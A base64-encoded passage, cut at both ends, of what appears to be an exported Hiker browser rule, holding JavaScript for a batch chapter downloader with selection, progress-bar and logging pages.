IsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgIGJhdGNoVGVhbSA9IEFycmF5LmZyb20obmV3IFNldChiYXRjaFRlYW0uY29uY2F0KGNob29zZVRlYW0pKSk7XFxuICAgICAgICAgICAgbGV0IGNvbXBsZXRlZCA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmNvbXBsZXRlZFxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgIGJhdGNoVGVhbSA9IGJhdGNoVGVhbS5maWx0ZXIoKGkpID0+ICFjb21wbGV0ZWQuaW5jbHVkZXMoaSkpO1xcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiLCBKU09OLnN0cmluZ2lmeShiYXRjaFRlYW0pKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgc3RhcnQsIGVuZCwgTVlfSUQpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpY29uX3NtYWxsXzRcXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuWPlua2iOWFqOmDqFxcXCIsXFxuICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/Zm9ybWF0PWdpZiZpZD1IekVqUHBJM05MOEQmdG9rZW49XFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoc3RhcnQsIGVuZCwgTVlfSUQpID0+IHtcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiKSA9PT0gXFxcIjFcXFwiKSByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXCI7XFxuICAgICAgICAgICAgY29uc3QgVG9vbCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL1Rvb2wuanNcXFwiKTtcXG4gICAgICAgICAgICBsZXQgY2hvb3NlVGVhbSA9IG5ldyBTZXQoVG9vbC5yYW5nZShzdGFydCwgZW5kKSk7XFxuICAgICAgICAgICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICAgICAgICAgIGJhdGNoVGVhbSA9IGJhdGNoVGVhbS5maWx0ZXIoeCA9PiAhY2hvb3NlVGVhbS5oYXMoeCkpO1xcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiLCBKU09OLnN0cmluZ2lmeShiYXRjaFRlYW0pKTtcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxuICAgICAgICAgICAgcmV0dXJuIFxcXCJoaWtlcjovL2VtcHR5XFxcIlxcbiAgICAgICAgfSwgc3RhcnQsIGVuZCwgTVlfSUQpLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJpY29uX3NtYWxsXzRcXFwiXFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuehruiupOmAieS4rVxcXCIsXFxuICAgICAgICBwaWNfdXJsOiBcXFwiaHR0cHM6Ly9pbWcuaWNvbnM4LmNvbS8/Zm9ybWF0PWdpZiZpZD10TXJ2dGM2VDloVmImdG9rZW49XFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoTVlfSUQpID0+IHtcXG4gICAgICAgICAgICBpZiAoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiLCBcXFwiLTFcXFwiKSAhPT0gXFxcIi0xXFxcIikge1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v5q2j5Zyo5LiL6L295ZOmflxcXCI7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgICAgIGxldCBiYXRjaFRlYW0gPSBKU09OLnBhcnNlKGdldE15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiLCBcXFwiW11cXFwiKSB8fCBcXFwiW11cXFwiKTtcXG4gICAgICAgICAgICByZXR1cm4gYmF0Y2hUZWFtLmxlbmd0aCA9PT0gMCA/IFxcXCJ0b2FzdDovL+S9oOi/mOS7gOS5iOmDveayoeaciemAiVxcXCIgOiBcXFwiaGlrZXI6Ly9wYWdlL0JhdGNoLnZpZXcjbm9SZWZyZXNoIyNub0hpc3RvcnkjI25vUmVjb3JkSGlzdG9yeSNcXFwiO1xcbiAgICAgICAgfSwgTVlfSUQpLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBuZXdXaW5kb3c6IHRydWUsXFxuICAgICAgICAgICAgd2luZG93SWQ6IE1ZX0lEICsgXFxcIi8v5om56YeP5LiL6L29XFxcIixcXG4gICAgICAgICAgICBNWV9JRDogTVlfSUQsXFxuICAgICAgICAgICAgY2hhcHRlckxpc3Q6IGJhY2t1cENoYXB0ZXJMaXN0LFxcbiAgICAgICAgICAgIGluZm86IGluZm9cXG4gICAgICAgIH0sXFxuICAgICAgICBjb2xfdHlwZTogXFxcImljb25fc21hbGxfNFxcXCJcXG4gICAgfSk7XFxuICAgIHNldFR5cGUoKTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICB9KTtcXG4gICAgbGV0IGJhdGNoVGVhbSA9IEpTT04ucGFyc2UoZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIFxcXCJbXVxcXCIpIHx8IFxcXCJbXVxcXCIpO1xcbiAgICBsZXQgY29tcGxldGVkID0gW107XFxuICAgIGZvciAobGV0IGkgPSAwLCBpdGVtID0gY2hhcHRlckxpc3RbMF07IGkgPCBjaGFwdGVyTGlzdC5sZW5ndGg7IGl0ZW0gPSBjaGFwdGVyTGlzdFsrK2ldKSB7XFxuICAgICAgICBsZXQgaXNfZG93bmxvYWQgPSByZWNvcmQuaW5jbHVkZXMoaXRlbS50aXRsZSk7XFxuXFxuICAgICAgICBpZiAoaXNfZG93bmxvYWQpIHtcXG4gICAgICAgICAgICBjb21wbGV0ZWQucHVzaChpdGVtLkNJRCk7XFxuICAgICAgICAgICAgaWYgKHRhZ0ZpbHRlciAhPT0gXFxcIjFcXFwiKSB7XFxuICAgICAgICAgICAgICAgIGNoYXB0ZXJUZWFtLnB1c2goY29tRnVuKGl0ZW0uQ0lELCBpdGVtKSk7XFxuICAgICAgICAgICAgfVxcbiAgICAgICAgfSBlbHNlIGlmICghaXNfZG93bmxvYWQgJiYgdGFnRmlsdGVyICE9PSBcXFwiMlxcXCIpIHtcXG4gICAgICAgICAgICBjaGFwdGVyVGVhbS5wdXNoKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IGJhdGNoVGVhbS5pbmNsdWRlcyhpdGVtLkNJRCkgPyBcXFwi4oCY4oCYXFxcIiArIGl0ZW0udGl0bGUgKyBcXFwi4oCZ4oCZXFxcIiA6IGl0ZW0udGl0bGUsXFxuICAgICAgICAgICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZShjbGlja0Nob29zZSwgaXRlbS50aXRsZSwgTVlfSUQsIGl0ZW0uQ0lEKSxcXG4gICAgICAgICAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjXFxcIiArIGl0ZW0uQ0lEXFxuICAgICAgICAgICAgICAgIH0sXFxuICAgICAgICAgICAgICAgIGNvbF90eXBlOiBkZWZfRG9WaV9TdHlsZVxcbiAgICAgICAgICAgIH0pO1xcbiAgICAgICAgfVxcbiAgICB9XFxuICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpjb21wbGV0ZWRcXFwiLCBKU09OLnN0cmluZ2lmeShjb21wbGV0ZWQpKTtcXG59XFxuc3dpdGNoICh2aWV3TW9kZSkge1xcbiAgICBjYXNlIFxcXCIwXFxcIjpcXG4gICAgICAgIHNpbmdsZVZpZXcoKTtcXG4gICAgICAgIGJyZWFrO1xcbiAgICBjYXNlIFxcXCIxXFxcIjpcXG4gICAgICAgIGJhdGNoVmlldygpO1xcbiAgICAgICAgYnJlYWs7XFxufVxcbmlmIChpc1JldmVyc2UgPT09IFxcXCIxXFxcIikge1xcbiAgICBjaGFwdGVyVGVhbS5yZXZlcnNlKCk7XFxufVxcbmxheW91dC5wdXNoLmFwcGx5KGxheW91dCwgY2hhcHRlclRlYW0pO1xcbnNldFJlc3VsdChsYXlvdXQpO1wifSx7XCJjb2xfdHlwZVwiOlwibW92aWVfM1wiLFwibmFtZVwiOlwiI3Yu5om56YeP5LiL6L295ZmoXCIsXCJwYXRoXCI6XCJCYXRjaC52aWV3XCIsXCJydWxlXCI6XCJqczpcXG5sZXQge1xcbiAgICBjaGFwdGVyTGlzdCxcXG4gICAgaW5mbyxcXG4gICAgTVlfSURcXG59ID0gTVlfUEFSQU1TO1xcbnNldFBhZ2VUaXRsZShcXFwi5LiL6L295ZmofFxcXCIraW5mby5ib29rTmFtZSk7XFxuYWRkTGlzdGVuZXIoXFxcIm9uQ2xvc2VcXFwiLCAkLnRvU3RyaW5nKChNWV9JRCkgPT4ge1xcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcIjppc1N0YXJ0XFxcIik7XFxuICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFwiOnN0YXR1c1xcXCIpO1xcbiAgICBjbGVhck15VmFyKE1ZX0lEICsgXFxcIjpiYXRjaFRlYW1cXFwiKTtcXG4gICAgLy9yZWZyZXNoUGFnZSgpO1xcbn0sIE1ZX0lEKSk7XFxuXFxubGV0IGlzU3RhcnQgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6aXNTdGFydFxcXCIsIFxcXCIwXFxcIik7XFxubGV0IHN0YXR1cyA9IGdldE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiMFxcXCIpO1xcbmxldCBsYXlvdXQgPSBbXTtcXG5cXG5sZXQgYmF0Y2hUZWFtID0gSlNPTi5wYXJzZShnZXRNeVZhcihNWV9JRCArIFxcXCI6YmF0Y2hUZWFtXFxcIiwgXFxcIltdXFxcIikgfHwgXFxcIltdXFxcIik7XFxuaWYodHlwZW9mIGNoYXB0ZXJMaXN0ID09PSBcXFwic3RyaW5nXFxcIil7XFxuICAgIGNoYXB0ZXJMaXN0ID0gSlNPTi5wYXJzZShyZXF1ZXN0KFxcXCJmaWxlOi8vXFxcIitjaGFwdGVyTGlzdCl8fFxcXCJbXVxcXCIpO1xcbn1cXG5sZXQgY2hhcHRlclRlYW0gPSBiYXRjaFRlYW0ubWFwKHYgPT4ge1xcbiAgICBsZXQgY2hhcHRlckl0ZW0gPSBjaGFwdGVyTGlzdFt2XTtcXG4gICAgY2hhcHRlckl0ZW0uQ0lEID0gdjtcXG4gICAgcmV0dXJuIGNoYXB0ZXJJdGVtO1xcbn0pO1xcbmlmIChpc1N0YXJ0ID09PSBcXFwiMFxcXCIpIHtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCLlvIDlp4vkuIvovb1bXFxcIiArIGNoYXB0ZXJUZWFtLmxlbmd0aCArIFxcXCJdXFxcIixcXG4gICAgICAgIHVybDogJChcXFwiI25vTG9hZGluZyNcXFwiKS5sYXp5UnVsZSgoY2hhcHRlclRlYW0sIGluZm8sIE1ZX0lEKSA9PiB7XFxuICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiLCBcXFwiMVxcXCIpO1xcbiAgICAgICAgICAgIHJlZnJlc2hQYWdlKGZhbHNlKTtcXG4gICAgICAgICAgICBsZXQgZG93bmxvYWQgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9CYXRjaFN0YXRpc3RpY3MuanNcXFwiKTtcXG4gICAgICAgICAgICBpZihpbmZvLnR5cGU9PT1cXFwiY29taWNcXFwiJiZpbmZvLmNvbWljU2NoZW1lPT09XFxcIjFcXFwiKXtcXG4gICAgICAgICAgICAgICAgZG93bmxvYWQ9ZG93bmxvYWQuYjtcXG4gICAgICAgICAgICB9ZWxzZXtcXG4gICAgICAgICAgICAgICAgZG93bmxvYWQ9ZG93bmxvYWQuYTtcXG4gICAgICAgICAgICB9XFxuICAgICAgICAgICAgcmV0dXJuIGRvd25sb2FkKGNoYXB0ZXJUZWFtLCBpbmZvLCBNWV9JRCkgfHwgXFxcInRvYXN0Oi8v5LiL6L296ZSZ6K+vXFxcIjtcXG4gICAgICAgIH0sIGNoYXB0ZXJUZWFtLCBpbmZvLCBNWV9JRCksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInRleHRfY2VudGVyXzFcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwifHzlvIDlp4vkuIvovb1cXFwiXFxuICAgICAgICB9XFxuICAgIH0pO1xcbiAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICB0aXRsZTogXFxcIuS7u+WKoeWIl+ihqO+8mlxcXCIsXFxuICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCIsXFxuICAgIH0pO1xcbiAgICBmb3IgKGxldCBpdGVtIG9mIGNoYXB0ZXJUZWFtKSB7XFxuICAgICAgICBsYXlvdXQucHVzaCh7XFxuICAgICAgICAgICAgdGl0bGU6IGl0ZW0udGl0bGUsXFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzJcXFwiXFxuICAgICAgICB9KTtcXG4gICAgfVxcblxcbn0gZWxzZSB7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5LiL6L296L+b5bqmOjAvXFxcIitjaGFwdGVyVGVhbS5sZW5ndGgsXFxuICAgICAgICBkZXNjOiBcXFwi4oCc4oCc4oCd4oCd4paH4paH4paH4paH4paH4paH4paH4paH4paH4paHXFxcIi5mb250Y29sb3IoXFxcIiNlNWUxZTRcXFwiKStcXFwiIDAlXFxcIixcXG4gICAgICAgIHVybDogXFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0X2NlbnRlcl8xXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcInx85LiL6L296L+b5bqmXFxcIixcXG4gICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2VcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOiBcXFwi5ZCO5Y+w5LiL6L29XFxcIixcXG4gICAgICAgIHVybDogXFxcImZ1bmM6Ly9iYWNrZ3JvdW5kXFxcIixcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIlxcbiAgICB9KTtcXG5cXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFtcXFwiW+WPlua2iOS4i+i9vV1cXFwiLCBcXFwiW+ato+WcqOWBnOatoi4uLl1cXFwiLCBcXFwiW+i/lOWbnl1cXFwiLCBcXFwiW+WkhOeQhuWksei0pV1cXFwiLCBcXFwiW+mHjeaWsOW8gOWni11cXFwiXVtzdGF0dXNdLFxcbiAgICAgICAgdXJsOiAkKFxcXCIjbm9Mb2FkaW5nI1xcXCIpLmxhenlSdWxlKChNWV9JRCkgPT4ge1xcbiAgICAgICAgICAgIGxldCBzdGF0dXMgPSBnZXRNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIiwgXFxcIjBcXFwiKTtcXG4gICAgICAgICAgICBpZiAoc3RhdHVzID09PSBcXFwiMFxcXCIpIHtcXG4gICAgICAgICAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOnN0YXR1c1xcXCIsIFxcXCIxXFxcIik7XFxuICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6IFxcXCJb5q2j5Zyo5YGc5q2iLi4uXVxcXCIsXFxuICAgICAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOS4i+i9veaOp+WItlxcXCJcXG4gICAgICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICAgICAgfSk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/mraPlnKjlj5bmtojkuIvovb3ku7vliqFcXFwiO1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoc3RhdHVzID09PSBcXFwiMVxcXCIpIHtcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+ato+WcqOaaguWBnC4uLlxcXCI7XFxuICAgICAgICAgICAgfSBlbHNlIGlmIChzdGF0dXMgPT09IFxcXCIyXFxcIikge1xcbiAgICAgICAgICAgICAgICBiYWNrKCk7XFxuICAgICAgICAgICAgICAgIHJldHVybiBcXFwidG9hc3Q6Ly/lt7LpgIDlh7rkuIvovb3lmahcXFwiO1xcbiAgICAgICAgICAgIH0gZWxzZSBpZiAoW1xcXCIzXFxcIiwgXFxcIjRcXFwiXS5pbmNsdWRlcyhzdGF0dXMpKSB7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFwiOmlzU3RhcnRcXFwiKTtcXG4gICAgICAgICAgICAgICAgY2xlYXJNeVZhcihNWV9JRCArIFxcXCI6c3RhdHVzXFxcIik7XFxuICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoTVlfSUQgKyBcXFwiOmxvZ1xcXCIpO1xcbiAgICAgICAgICAgICAgICByZWZyZXNoUGFnZSgpO1xcbiAgICAgICAgICAgICAgICByZXR1cm4gXFxcInRvYXN0Oi8v6YeN5paw54K55Ye75LiL6L29XFxcIlxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0sIE1ZX0lEKSxcXG4gICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8yXFxcIixcXG4gICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcInx85LiL6L295o6n5Yi2XFxcIlxcbiAgICAgICAgfVxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgY29sX3R5cGU6IFxcXCJsaW5lX2JsYW5rXFxcIlxcbiAgICB9KTtcXG4gICAgbGF5b3V0LnB1c2goe1xcbiAgICAgICAgdGl0bGU6IFxcXCI8c3Ryb25nPuS4i+i9veaXpeW/lzwvc3Ryb25nPlxcXCIuYmlnKCksXFxuICAgICAgICBjb2xfdHlwZTogXFxcInJpY2hfdGV4dFxcXCIsXFxuICAgICAgICBcXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIGNvbF90eXBlOiBcXFwibGluZVxcXCIsXFxuICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCJ8fOaXpeW/l1xcXCJcXG4gICAgICAgIH1cXG4gICAgfSk7XFxuICAgIGxheW91dC5wdXNoKHtcXG4gICAgICAgIHRpdGxlOlxcXCLigJzigJzigJ3igJ0kPlxcXCIrXFxcIuW8gOWni+S4i+i9vS4uLi4uLlxcXCIuZm9udGNvbG9yKFxcXCIjMDBmZjAwXFxcIiksXFxuICAgICAgICB1cmw6XFxcImhpa2VyOi8vZW1wdHlcXFwiLFxcbiAgICAgICAgY29sX3R5cGU6IFxcXCJ0ZXh0XzFcXFwiLFxcbiAgICAgICAgZXh0cmE6IHtcXG4gICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwiI2xvZyMwXFxcIixcXG4gICAgICAgICAgICBsaW5lVmlzaWJsZTpmYWxzZVxcbiAgICAgICAgfVxcbiAgICB9KTtcXG59XFxuXFxuc2V0UmVzdWx0KGxheW91dCk7XCJ9LHtcImNvbF90eXBlXCI6XCJtb3ZpZV8zXCIsXCJuYW1lXCI6XCIjZmcu5om56YeP5LiL6L2957uf6K6hXCIsXCJwYXRoXCI6XCJCYXRjaFN0YXRpc3RpY3MuanNcIixcInJ1bGVcIjpcImNvbnN0IFRvb2wgPSAkLnJlcXVpcmUoXFxcImhpa2VyOi8vcGFnZS9Ub29sLmpzXFxcIik7XFxuY29uc3QgQ29uZmlnID0gJC5yZXF1aXJlKFxcXCJoaWtlcjovL3BhZ2UvQ29uZmlnLmpzXFxcIik7XFxuXFxuJC5leHBvcnRzLmEgPSBmdW5jdGlvbihjaGFwdGVyVGVhbSwgaW5mbywgTVlfSUQpIHtcXG4gICAgaWYgKGNoYXB0ZXJUZWFtLmxlbmd0aCA9PT0gMCkge1xcbiAgICAgICAgcmV0dXJuIFxcXCJ0b2FzdDovL+epuueahOS4i+i9vemYn+WIl1xcXCI7XFxuICAgIH1cXG5cXG4gICAgdmFyIGNvdW50ID0gMDtcXG4gICAgdmFyIHRhc2tDb3VudCA9IGNoYXB0ZXJUZWFtLmxlbmd0aDtcXG4gICAgdmFyIHN1Y2Nlc3NDSUQgPSBbXTtcXG4gICAgdmFyIGZhaWxOYW1lID0gW107XFxuICAgIHZhciBsb2dDb3VudCA9IDE7XFxuICAgIHZhciB0YXNrVGVhbSA9IGNoYXB0ZXJUZWFtLm1hcChjaGFwdGVySXRlbSA9PiAoe1xcbiAgICAgICAgZnVuYzogdGFzayxcXG4gICAgICAgIGlkOiBjaGFwdGVySXRlbS50aXRsZSxcXG4gICAgICAgIHBhcmFtOiB7XFxuICAgICAgICAgICAgY2hhcHRlckl0ZW06IGNoYXB0ZXJJdGVtLFxcbiAgICAgICAgICAgIGluZm86IGluZm8sXFxuICAgICAgICAgICAgTVlfSUQ6IE1ZX0lEXFxuICAgICAgICB9XFxuICAgIH0pKTtcXG4gICAgbGV0IGxvZ051bSA9IENvbmZpZy5sb2dOdW07XFxuICAgIGxldCBsb2dEYXRlID0gMDtcXG4gICAgZnVuY3Rpb24gcHV0TG9nKHRleHQpIHtcXG4gICAgICAgIGxvZyh0ZXh0KTtcXG4gICAgICAgIGxldCBub3dEYXRlPURhdGUubm93KCk7XFxuICAgICAgICBpZigobm93RGF0ZS1sb2dEYXRlKTw1MDApe1xcbiAgICAgICAgICAgIHJldHVybjtcXG4gICAgICAgIH1cXG4gICAgICAgIGxvZ0RhdGU9bm93RGF0ZTtcXG4gICAgICAgIGlmIChsb2dDb3VudCA+PSBsb2dOdW0pIHtcXG4gICAgICAgICAgICBkZWxldGVJdGVtKE1ZX0lEICsgXFxcIiNsb2cjXFxcIiArIChsb2dDb3VudCAtIDEwKSk7XFxuICAgICAgICB9XFxuICAgICAgICBhZGRJdGVtQWZ0ZXIoTVlfSUQgKyBcXFwifHzml6Xlv5dcXFwiLCB7XFxuICAgICAgICAgICAgdXJsOiBcXFwiaGlrZXI6Ly9lbXB0eVxcXCIsXFxuICAgICAgICAgICAgdGl0bGU6IFxcXCIkPlxcXCIgKyB0ZXh0LFxcbiAgICAgICAgICAgIGNvbF90eXBlOiBcXFwidGV4dF8xXFxcIixcXG4gICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICBsaW5lVmlzaWJsZTogZmFsc2UsXFxuICAgICAgICAgICAgICAgIGlkOiBNWV9JRCArIFxcXCIjbG9nI1xcXCIgKyBsb2dDb3VudFxcbiAgICAgICAgICAgIH1cXG4gICAgICAgIH0pO1xcbiAgICAgICAgbG9nQ291bnQrKztcXG4gICAgfVxcbiAgICBmdW5jdGlvbiB0YXNrKHRhc2tQYXJhbSkge1xcbiAgICAgICAgbGV0IHJlc3VsdCA9ICQucmVxdWlyZShcXFwiaGlrZXI6Ly9wYWdlL0JhdGNoLmV4ZS5qc1xcXCIpKHRhc2tQYXJhbSk7XFxuICAgICAgICByZXR1cm4gcmVzdWx0O1xcbiAgICB9XFxuXFxuICAgIGZ1bmN0aW9uIGxpc3RlbmVyKHBlcmNoLCBpZCwgZXJyb3IsIENJRCkge1xcbiAgICAgICAgY291bnQrKztcXG4gICAgICAgIGxldCBpc1N1Y2Nlc3MgPSBmYWxzZTtcXG4gICAgICAgIGlmIChlcnJvciAhPSBudWxsKSB7XFxuICAgICAgICAgICAgZmFpbE5hbWUucHVzaChpZCk7XFxuICAgICAgICAgICAgcHV0TG9nKFxcXCJbbGlzdGVuZXJd5LiL6L295aSx6LSl77yaXFxcIiArIGlkICsgXFxcIjxFUlJPUkAgXFxcIiArIGVycm9yICsgXFxcIj5cXFwiKTtcXG4gICAgICAgIH0gZWxzZSBpZiAoQ0lEID49IDApIHtcXG4gICAgICAgICAgICBzdWNjZXNzQ0lELnB1c2goQ0lEKTtcXG4gICAgICAgICAgICBsZXQgcmF0aW8gPSAoY291bnQgLyB0YXNrQ291bnQpLnRvRml4ZWQoNCk7XFxuICAgICAgICAgICAgbGV0IHN0cmlwQ291bnQgPSBNYXRoLmNlaWwocmF0aW8gKiAxMCk7XFxuICAgICAgICAgICAgaXNTdWNjZXNzID0gdHJ1ZTtcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHtcXG4gICAgICAgICAgICAgICAgdGl0bGU6IFxcXCLkuIvovb3ov5vluqbvvJpcXFwiICsgc3VjY2Vzc0NJRC5sZW5ndGggKyBcXFwiL1xcXCIgKyB0YXNrQ291bnQsXFxuICAgICAgICAgICAgICAgIGRlc2M6IFxcXCLigJzigJzigJ3igJ1cXFwiICsgXFxcIuKWh1xcXCIucmVwZWF0KHN0cmlwQ291bnQpLmZvbnRjb2xvcihcXFwiI2ZmYWMyZFxcXCIpICsgXFxcIuKWh1xcXCIucmVwZWF0KDEwIC0gc3RyaXBDb3VudCkuZm9udGNvbG9yKFxcXCIjZTVlMWU0XFxcIikgKyBcXFwiIFxcXCIgKyBTdHJpbmcoKHJhdGlvICogMTAwKSkuc2xpY2UoMCwgNSkgKyBcXFwiJVxcXCIsXFxuICAgICAgICAgICAgICAgIGV4dHJhOiB7XFxuICAgICAgICAgICAgICAgICAgICBpZDogTVlfSUQgKyBcXFwifHzkuIvovb3ov5vluqZcXFwiXFxuICAgICAgICAgICAgICAgIH1cXG4gICAgICAgICAgICB9KTtcXG4gICAgICAgICAgICBwdXRMb2coXFxcIltsaXN0ZW5lcl3lt7LlrozmiJDkuIvovb3vvJpcXFwiICsgaWQpO1xcbiAgICAgICAgfSBlbHNlIGlmIChDSUQgPT09IC0xKSB7XFxuICAgICAgICAgICAgZmFpbE5hbWUucHVzaChpZCk7XFxuICAgICAgICAgICAgcHV0TG9nKFxcXCJbbGlzdGVuZXJd5bey5YGc5q2i77yaXFxcIiArIGlkKTtcXG4gICAgICAgICAgICBjb3VudCA9IHRhc2tDb3VudDtcXG4gICAgICAgIH1cXG5cXG4gICAgICAgIGlmICh0YXNrQ291bnQgIT09IGNvdW50KSByZXR1cm47XFxuICAgICAgICBpZiAoc3VjY2Vzc0NJRC5sZW5ndGggPT09IHRhc2tDb3VudCkge1xcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oe1xcbiAgICAgICAgICAgICAgICBkZXNjOiBcXFwi4oCc4oCc4oCd4oCdXFxcIiArIFxcXCLilodcXFwiLnJlcGVhdCgxMCkuZm9udGNvbG9yKFxcXCIjMDBmZjAwXFxcIikgKyBcXFwiIDEwMCVcXFwiLFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcbiAgICAgICAgICAgICAgICAgICAgaWQ6IE1ZX0lEICsgXFxcInx85LiL6L296L+b5bqmXFxcIlxcbiAgICAgICAgICAgICAgICB9XFxuICAgICAgICAgICAgfSk7XFxuICAgICAgICB9XFxuICAgICAgICBsZXQgYmF0Y2hUZWFtID0gSlNPTi5wYXJzZShnZXRNeVZhcihNWV9JRCArIFxcXCI6YmF0Y2hUZWFtXFxcIiwgXFxcIltdXFxcIikgfHwgXFxcIltdXFxcIik7XFxuICAgICAgICBsZXQgc3RhdHVzID0gZ2V0TXlWYXIoTVlfSUQgKyBcXFwiOnN0YXR1c1xcXCIsIFxcXCIwXFxcIik7XFxuICAgICAgICBsZXQgZmFpbFRlYW0gPSBiYXRjaFRlYW0uZmlsdGVyKHYgPT4gIXN1Y2Nlc3NDSUQuaW5jbHVkZXModikpO1xcbiAgICAgICAgcHV0TXlWYXIoTVlfSUQgKyBcXFwiOmJhdGNoVGVhbVxcXCIsIEpTT04uc3RyaW5naWZ5KGZhaWxUZWFtKSk7XFxuICAgICAgICBpZiAoZmFpbFRlYW0ubGVuZ3RoID4gMCAmJiBzdGF0dXMgIT09IFxcXCIxXFxcIikge1xcbiAgICAgICAgICAgIHB1dE15VmFyKE1ZX0lEICsgXFxcIjpzdGF0dXNcXFwiLCBcXFwiM1xcXCIpO1xcbiAgICAgICAgICAgIHB1dExvZyhcXFwi5LiL6L295aSx6LSlOltcXFwiICsgZmFpbE5hbWUuam9pbihcXFw